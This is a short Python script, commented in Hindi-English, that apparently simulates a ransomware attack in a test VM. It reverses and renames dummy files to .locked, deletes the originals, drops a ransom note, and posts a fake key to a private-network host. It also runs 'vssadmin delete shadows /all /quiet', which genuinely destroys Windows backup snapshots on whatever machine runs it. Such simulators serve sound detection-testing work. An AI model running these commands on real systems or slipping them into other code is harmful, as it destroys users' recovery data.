import os, sys, time, subprocess, requests

DATA = r"C:\Data"
MODE = sys.argv[1] if len(sys.argv) > 1 else "slow"   # fast ya slow
N = 500 if MODE == "fast" else 30
DELAY = 0 if MODE == "fast" else 2

os.makedirs(DATA, exist_ok=True)

# 1. dummy files banao
for i in range(N):
    with open(f"{DATA}\\doc_{i}.txt", "w") as f:
        f.write("dummy data " * 50)
time.sleep(3)

# 2. "encrypt": .locked file likho, original delete karo
for i in range(N):
    src = f"{DATA}\\doc_{i}.txt"
    with open(src, "rb") as f:
        data = f.read()
    with open(src + ".locked", "wb") as f:
        f.write(data[::-1])          # sirf reverse, asli encryption nahi
    os.remove(src)
    time.sleep(DELAY)

# 3. ransom note
with open(f"{DATA}\\README_RESTORE.txt", "w") as f:
    f.write("SIMULATION ONLY. Your dummy files are 'encrypted'.")

# 4. shadow copy delete (sirf test VM mein)
subprocess.run("vssadmin delete shadows /all /quiet", shell=True)

# 5. fake key upload
try:
    requests.post("http://192.168.56.1:5000/key", data={"key": "FAKE-KEY-123"}, timeout=5)
    print("key uploaded")
except Exception as e:
    print("upload failed:", e)

print("done, mode =", MODE)